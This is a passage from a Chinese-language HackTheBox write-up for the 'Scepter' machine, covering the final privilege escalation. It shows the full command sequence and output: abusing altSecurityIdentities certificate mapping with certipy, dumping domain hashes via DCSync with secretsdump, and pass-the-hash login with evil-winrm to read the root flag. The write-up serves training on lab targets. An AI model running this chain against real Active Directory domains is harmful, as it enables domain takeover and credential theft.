class=\"hljs-variable\"\u003e$map\u003c/span\u003e}\nSet-ADUser -Identity \u003cspan class=\"hljs-string\"\u003e\"p.adams\"\u003c/span\u003e -Replace @{altSecurityIdentities=\u003cspan class=\"hljs-variable\"\u003e$map\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看更改后的属性值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eGet-ADUser -Identity \u003cspan class=\"hljs-string\"\u003e\"p.adams\"\u003c/span\u003e -Properties altSecurityIdentities | Select-Object altSecurityIdentities\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003ecertipy\u003c/code\u003e 根据计算机账户的证书 \u003ccode\u003eciallo.pfx\u003c/code\u003e 申请用户 \u003ccode\u003ep.adams\u003c/code\u003e 的 \u003ccode\u003eTGT\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter certipy-ad auth -pfx ciallo.pfx -dc-ip 10.10.11.65 -username p.adams\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] The provided username does not match the identification found \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the provided certificate: \u003cspan class=\"hljs-string\"\u003e'P.ADAMS'\u003c/span\u003e - \u003cspan class=\"hljs-string\"\u003e'ciallo$'\u003c/span\u003e\nDo you want to \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e? (Y/n) y\n[*] Using principal: p.adams@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to \u003cspan class=\"hljs-string\"\u003e'p.adams.ccache'\u003c/span\u003e\n[*] Trying to retrieve NT \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'p.adams'\u003c/span\u003e\n[*] Got \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'p.adams@scepter.htb'\u003c/span\u003e: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接 \u003ccode\u003eDCSync\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter secretsdump.py -k -no-pass dc01.scepter.htb -dc-ip 10.10.11.65                                       \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n                                                                                                               \n[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::\n...many...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter evil-winrm -i dc01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Administrator\\desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\nfcd40eb94aeca1942488f8decb6cc0b7\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e反正就是每次打AD都是不会的，靠大佬带过的…\u003c/p\u003e\n\u003cp\u003e第一次遇到 ADCS 类的攻击，无从下手，任重道远。\u003c/p\u003e","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","updated":"2025-07-24","comments":true,"tags":["Windows靶机","HackTheBox","ADCS","ESC"],"categories":"靶机","description":"Machine Scepterl https://app.hackthebox.com/machines/Scepter | Hard PS：一直以为 Season 过了之后就不能白嫖靶机了…导致错过了两周的靶机…呜呜呜 前期踩点 Windows 靶机的端口，但不一定是域控主机（PS:后面才知道我扫..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxMachine - Scepter"},"buildId":"rYHkFZPcHeH30wRPpLsoD","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>